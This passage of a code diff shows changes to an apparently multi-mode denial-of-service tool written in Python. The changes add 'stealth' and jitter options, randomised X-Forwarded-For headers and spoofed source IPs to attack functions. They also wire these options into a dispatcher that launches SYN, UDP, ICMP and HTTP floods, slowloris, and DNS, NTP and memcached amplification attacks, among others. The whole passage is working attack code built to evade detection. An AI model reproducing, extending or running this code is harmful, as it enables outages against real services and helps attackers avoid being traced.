                     async with aiohttp.ClientSession(connector=connector) as partial_session:
@@ -1045,8 +1284,9 @@ async def http_fragmentation_attack(target_url: str, stop_event: threading.Event
                 await asyncio.sleep(pause_time)
 
 async def ws_dos_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
-                       rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """WebSocket denial of service attack."""
+                       rate_limit: int, proxies: Optional[List[str]] = None,
+                       stealth: bool = False, jitter: int = 0) -> None:
+    """WebSocket denial of service attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -1054,10 +1294,18 @@ async def ws_dos_attack(target_url: str, stop_event: threading.Event, pause_time
     if not target_url.startswith(("ws://", "wss://", "http://", "https://")):
         target_url = f"ws://{target_url}"
 
+    # Apply stealth options
+    if stealth:
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     async with session.ws_connect(
                         target_url,
@@ -1077,8 +1325,9 @@ async def ws_dos_attack(target_url: str, stop_event: threading.Event, pause_time
                 await asyncio.sleep(pause_time)
 
 async def quic_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
-                    rate_limit: int, proxies: Optional[List[str]] = None) -> None:
-    """QUIC protocol flood attack."""
+                    rate_limit: int, proxies: Optional[List[str]] = None,
+                    stealth: bool = False, jitter: int = 0) -> None:
+    """QUIC protocol flood attack with stealth options."""
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -1092,10 +1341,22 @@ async def quic_flood(target_url: str, stop_event: threading.Event, pause_time: f
         "Connection": "keep-alive"
     }
 
+    # Apply stealth options
+    if stealth:
+        headers.update({
+            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
+            "Accept-Encoding": "gzip, deflate, br"
+        })
+        pause_time = max(pause_time, 1.0)  # Slower in stealth mode
+
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
             async with semaphore:
                 try:
+                    # Add jitter if specified
+                    if jitter > 0:
+                        await asyncio.sleep(get_random_jitter(jitter))
+
                     proxy = next(proxy_pool) if proxy_pool else None
                     connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
                     async with aiohttp.ClientSession(connector=connector) as quic_session:
@@ -1204,6 +1465,8 @@ async def main() -> None:
         proxies = validate_proxies(proxies)
         asyncio.create_task(monitor_proxy_health(proxies))
 
+    spoof_ips = load_spoof_ips(args.spoof_ips) if args.spoof_ips else None
+
     target = args.url.split("//")[-1].split("/")[0] if args.url else None
 
     if args.scan and target:
@@ -1239,114 +1502,141 @@ async def main() -> None:
     if args.attack_mode == "char-gen":
         target_ip = await resolve_target(target)
         target_port = args.port or 19
-        threading.Thread(target=char_gen_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=char_gen_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("CHAR-GEN flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "rst-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 80
-        threading.Thread(target=rst_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=rst_flood, args=(target_ip, target_port, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("RST flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "ack-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 80
-        threading.Thread(target=ack_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=ack_flood, args=(target_ip, target_port, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("ACK flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "http-fragmentation":
         for _ in range(args.threads):
-            task = asyncio.create_task(http_fragmentation_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(http_fragmentation_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "ws-dos":
         for _ in range(args.threads):
-            task = asyncio.create_task(ws_dos_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(ws_dos_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "quic-flood":
         for _ in range(args.threads):
-            task = asyncio.create_task(quic_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(quic_flood(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "land-attack":
         target_ip = await resolve_target(target)
         target_port = args.port or 80
-        threading.Thread(target=land_attack, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=land_attack, args=(target_ip, target_port, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("LAND attack", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "ping-of-death":
         target_ip = await resolve_target(target)
-        threading.Thread(target=ping_of_death, args=(target_ip, args.duration)).start()
+        threading.Thread(target=ping_of_death, args=(target_ip, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("Ping of Death", target_ip, args.duration)).start()
     elif args.attack_mode == "slow-post":
         for _ in range(args.threads):
-            task = asyncio.create_task(slow_post_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(slow_post_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "xml-bomb":
         for _ in range(args.threads):
-            task = asyncio.create_task(xml_bomb_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(xml_bomb_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "ntlm-auth-flood":
         for _ in range(args.threads):
-            task = asyncio.create_task(ntlm_auth_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(ntlm_auth_flood(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "syn-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 80
-        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration, args.stealth, args.random_ports, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("SYN flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "http-flood":
         for _ in range(args.threads):
-            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(rate_limited_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                None, "json", 3, args.stealth, args.jitter, args.obfuscate, spoof_ips
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "slowloris":
         for _ in range(args.threads):
-            task = asyncio.create_task(slowloris_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(slowloris_attack(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                None, 3, args.stealth, args.jitter
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
     elif args.attack_mode == "udp-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 80
-        threading.Thread(target=udp_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=udp_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("UDP flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "icmp-flood":
         target_ip = await resolve_target(target)
-        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
+        threading.Thread(target=icmp_flood, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("ICMP flood", target_ip, args.duration)).start()
     elif args.attack_mode == "dns-amplification":
         target_ip = await resolve_target(target)
-        threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
+        threading.Thread(target=dns_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("DNS amplification", target_ip, args.duration)).start()
     elif args.attack_mode == "ftp-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 21
-        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("FTP flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "ssh-flood":
         target_ip = await resolve_target(target)
         target_port = args.port or 22
-        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
+        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("SSH flood", f"{target_ip}:{target_port}", args.duration)).start()
     elif args.attack_mode == "ntp-amplification":
         target_ip = await resolve_target(target)
-        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration)).start()
+        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("NTP amplification", target_ip, args.duration)).start()
     elif args.attack_mode == "memcached-amplification":
         target_ip = await resolve_target(target)
-        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration)).start()
+        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
         threading.Thread(target=simple_status, args=("Memcached amplification", target_ip, args.duration)).start()
     elif args.attack_mode == "smurf":
         target_ip = await resolve_target(target)
-        threading.Thread(target=smurf_attack, args=(target_ip, args.duration)).start()
+        threading.Thread(target=smurf_attack, args=(target_ip, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("Smurf attack", target_ip, args.duration)).start()
     elif args.attack_mode == "teardrop":
         target_ip = await resolve_target(target)
-        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration)).start()
+        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration, args.stealth)).start()
         threading.Thread(target=simple_status, args=("Teardrop attack", target_ip, args.duration)).start()
     elif args.attack_mode == "http2-flood":
         for _ in range(args.threads):
-            task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
+            task = asyncio.create_task(http2_flood(
+                args.url, stop_event, args.pause, args.rate_limit, proxies,
+                None, "json", 3, args.stealth, args.jitter, args.obfuscate
+            ))
             tasks.append(task)
         threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
 
